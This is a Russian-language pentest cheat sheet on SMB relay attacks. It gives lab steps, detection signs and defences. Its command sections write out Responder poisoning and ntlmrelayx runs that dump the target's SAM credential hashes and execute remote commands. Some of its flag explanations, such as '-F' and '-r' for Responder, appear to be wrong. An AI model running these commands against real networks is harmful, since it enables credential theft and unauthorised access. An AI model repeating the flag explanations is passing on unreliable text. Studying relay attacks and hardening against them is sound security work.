# SMB Relay (Updated for 2025)

**Источник:** US Cloud, June 2025  
**Новизна в 2025:** Усиление в Windows Server 2025 с введением EPA (Extended Protection for Authentication), но атака всё ещё возможна при неправильной конфигурации.

---

## 🎯 Цель атаки
Использовать перехваченную NTLM-аутентификацию для выполнения действий на целевых системах через SMB.

## 📋 Описание
SMB Relay — это атака, при которой NTLM-аутентификация жертвы перехватывается и пересылается на целевой SMB-сервер.  
При отсутствии SMB signing или при уязвимых конфигурациях злоумышленник может выполнять команды или получать доступ к файлам.

В 2025 добавились:
- Необходимость учитывать EPA в Windows Server 2025.
- Возможность комбинировать с IPv6 (MITM6) и LLMNR Poisoning.

## ⚠ Условия эксплуатации
- SMB signing отключён или не требуется.
- Возможен перехват NTLM-хэшей (LLMNR/WPAD/IPv6 MITM).
- Нет Extended Protection или оно неправильно настроено.

## 🔹 Пошагово в лаборатории
> ⚠ Только в тестовой среде!

1. Запуск Responder без SMB (чтобы не поглощать хэш, а релеить):
```bash
responder -I eth0 -rdw -F
```
2. Запуск ntlmrelayx на SMB:
```bash
ntlmrelayx.py -t smb://target.lab.local --dump-sam
```
3. При удаче — выполнение команд:
```bash
ntlmrelayx.py -t smb://target.lab.local --exec "whoami"
```

## 📊 Признаки в логах и мониторинг
- Event ID 4624 (Logon Type 3) от нетипичных хостов.
- SMB-сессии с необычными источниками.
- Логи сетевых IDS/IPS (аномальные SMB-NTLM пакеты).

## 🛡 Меры защиты
- Включить SMB signing на всех серверах.
- Настроить Extended Protection (EPA).
- Запретить NTLM, использовать Kerberos.
- Мониторить подозрительные SMB-сессии.

## 🔗 Источники
- US Cloud, June 2025 — SMB Relay in WS2025

---

## 🔍 Разбор команд

### 1. Responder с релеем
```bash
responder -I eth0 -rdw -F
```
- **`-I eth0`** — интерфейс.
- **`-r`** — LLMNR.
- **`-d`** — NBT-NS.
- **`-w`** — WPAD.
- **`-F`** — отключает SMB/HTTP-сервер Responder для передачи хэшей ntlmrelayx.

### 2. ntlmrelayx — релей на SMB
```bash
ntlmrelayx.py -t smb://target.lab.local --dump-sam
```
- **`-t smb://...`** — цель SMB.
- **`--dump-sam`** — выгрузка SAM.

### 3. ntlmrelayx — выполнение команды
```bash
ntlmrelayx.py -t smb://target.lab.local --exec "whoami"
```
- **`--exec`** — выполнить команду на целевом SMB-хосте.
